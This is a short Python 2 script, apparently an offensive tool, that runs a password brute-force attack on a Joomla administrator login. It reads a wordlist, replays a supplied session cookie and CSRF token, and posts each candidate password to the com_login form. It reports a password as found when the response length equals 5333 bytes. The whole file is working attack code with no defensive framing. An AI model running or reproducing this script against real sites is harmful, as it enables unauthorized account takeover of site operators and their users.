#coding: utf-8
import requests,argparse,urlparse

def banner():
    print('''
       _                       _         ____                 _    
      | |                     | |       |  _ \               | |   
      | | ___   ___  _ __ ___ | | __ _  | |_) |_ __ ___  __ _| | __
  _   | |/ _ \ / _ \| '_ ` _ \| |/ _` | |  _ <| '__/ _ \/ _` | |/ /
 | |__| | (_) | (_) | | | | | | | (_| | | |_) | | |  __/ (_| |   < 
  \____/ \___/ \___/|_| |_| |_|_|\__,_| |____/|_|  \___|\__,_|_|\_\
  
                      A Joomla Brute-Force attack.
                                                                   
    ''')

banner()

parser = argparse.ArgumentParser(description='Make a brute-force attack in Joomla application.')
parser.add_argument('-u', '--url', type=str, help='URL target', required=True)
parser.add_argument('-w', '--wordlist', type=str, help='Wordlist file', required=True)
parser.add_argument('-l', '--user', type=str, help='User that we will try authenticate', required=True)
parser.add_argument('-t', '--token', type=str, help='Authentication token that we send to the server when trying to authenticate', required=True)
args = parser.parse_args()

cook2 = raw_input('What is the valor of the cookie "b8da9856e1afd720ebee3877bf868927"? ')
url = args.url 
user = args.user
lista = args.wordlist
HeadEspecial = args.token 
host = urlparse.urlparse(url).netloc

headers = {'Host': host, 
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Referer': url,
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Upgrade-Insecure-Requests': '1',
'Content-Length': '110'}

cook = {'b8da9856e1afd720ebee3877bf868927': cook2 }

r = open(lista, 'r')
for i in r.readlines():
    senha = i.rstrip('\n')
    dados = {'username': user,
    'passwd': senha,
    'option': 'com_login',
    'task': 'login',
    'return': 'aW5kZXgucGhw',
    HeadEspecial: '1'}
    req = requests.post(url, data=dados, headers=headers, cookies=cook)
    if len(req.content) == 5333:
        print("[!] Password found -> " + senha)
        print(user + ":" + senha)
        break
    else:
        print("[+] Invalid password -> " + senha) 
